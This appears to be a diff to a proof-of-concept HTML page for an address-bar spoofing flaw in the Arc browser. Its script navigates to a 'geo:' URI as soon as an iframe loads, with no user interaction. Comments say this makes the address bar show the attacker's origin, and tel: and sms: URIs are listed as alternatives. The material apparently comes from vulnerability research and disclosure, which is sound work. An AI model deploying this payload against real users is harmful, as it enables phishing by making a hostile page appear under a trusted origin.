@@ -1,11 +1,17 @@
   <!DOCTYPE html>
   <html>
+  <head>
+    <title>.</title>
+  </head>
   <body>
   <script>
-    // Navigate to geo: URI scheme
-    // This triggers Arc's navigation delegate to update
-    // the address bar to this page's origin (attacker.github.io)
-    window.location = "geo:0,0";
+    // This fires as soon as the iframe loads.
+    // No user interaction needed.
+    window.location.href = "geo:0,0";
+
+    // Could also use:
+    // window.location.href = "tel:+1234567890";
+    // window.location.href = "sms:+1234567890";
   </script>
   </body>
   </html>
